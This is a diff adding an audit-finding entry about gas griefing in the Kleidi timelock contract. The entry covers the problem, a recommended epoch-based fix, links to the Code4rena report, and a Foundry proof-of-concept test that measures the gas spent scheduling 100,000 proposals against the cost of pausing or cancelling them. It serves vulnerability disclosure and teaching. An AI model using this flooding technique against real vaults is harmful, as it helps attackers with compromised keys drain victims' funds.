@@ -654,3 +654,80 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
 ```
 
 </details>
+
+## 12.[Medium] Gas griefing/attack via creating the proposals
+
+### Gas attack
+
+- Summary: The core of the problem lies in the protocol’s behavior that requires proposals to be either executed or canceled. When keys are compromised, attackers can send numerous transactions consuming gas, forcing the victims to spend a significant amount of gas to cancel these proposals. The defense mechanisms available—using pause guardians or cold signers to cancel proposals—also require the victims to pay gas fees. If attackers send enough transactions, the victim may not have enough funds to cancel all proposals, allowing the attackers to drain the vault.
+
+- Impact & Recommendation: Implement an epoch system in the timelock contract. Whenever the contract is paused, the epoch should advance to the next variable. Only transactions from the current epoch should be executable, making all previous proposals automatically invalid once the epoch changes.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-10-kleidi#m-01-gas-griefingattack-via-creating-the-proposals) & [Report](https://code4rena.com/reports/2024-10-kleidi)
+
+<details><summary>POC</summary>
+
+```solidity
+
+    function testGasConsumption() public {
+        bytes32 scheduleSalt = bytes32("saltxyz");
+        uint256 numOfProposals = 100000;
+        bytes32[] memory saltArray = new bytes32[](numOfProposals);
+        for(uint i; i < numOfProposals; i++) {
+            saltArray[i] = keccak256(abi.encodePacked("salt", bytes32(i + 1)));
+        }
+        bytes memory scheduleData = abi.encode(timelock.updateDelay, MINIMUM_DELAY);
+        address timelockAddress = address(timelock);
+        // initial call costs more gas
+        vm.prank(address(safe));
+        timelock.schedule(
+            timelockAddress,
+            0,
+            scheduleData,
+            scheduleSalt,
+            MINIMUM_DELAY
+        );
+        vm.startPrank(address(safe));
+        uint256 gasBeforeSchedule = gasleft();
+        for(uint256 i; i < numOfProposals; i++){
+            timelock.schedule(
+                timelockAddress,
+                0,
+                scheduleData,
+                saltArray[i],
+                MINIMUM_DELAY
+            );
+        }
+        uint256 gasAfterSchedule = gasleft();
+        vm.stopPrank();
+        bytes32[] memory ids = new bytes32[](numOfProposals);
+        for(uint256 i; i < numOfProposals; i++){
+            ids[i] = timelock.hashOperation(
+                address(timelock),
+                0,
+                scheduleData,
+                saltArray[i]
+            );
+        }
+        vm.startPrank(timelock.pauseGuardian());
+        uint256 gasBeforeCancel = gasleft();
+        timelock.pause(); // 10000 -> 32,260,154 4.6%
+        uint256 gasAfterCancel = gasleft();
+        vm.stopPrank();
+        // vm.startPrank(address(safe));
+        // uint256 gasBeforeCancel = gasleft();
+        // for(uint256 i; i < numOfProposals; i++){
+        //     timelock.cancel(ids[i]); // 10000 -> 44,890,040  448,900,040 6%
+        // }
+        // uint256 gasAfterCancel = gasleft();
+        // vm.stopPrank();
+        // For 100,000 proposals
+        // shecdule 7,398,200,040
+        // pause guardian pause 340,048,201 ~ 4.6%
+        // safe cancel 448,900,040 ~ 6%
+        console.log("Gas consumption of schedule: ", gasBeforeSchedule - gasAfterSchedule); // 10000 -> 739,820,040 7,398,200,040
+        console.log("Gas consumption of cancel: ", gasBeforeCancel - gasAfterCancel);
+    }
+
+```
+
+</details>
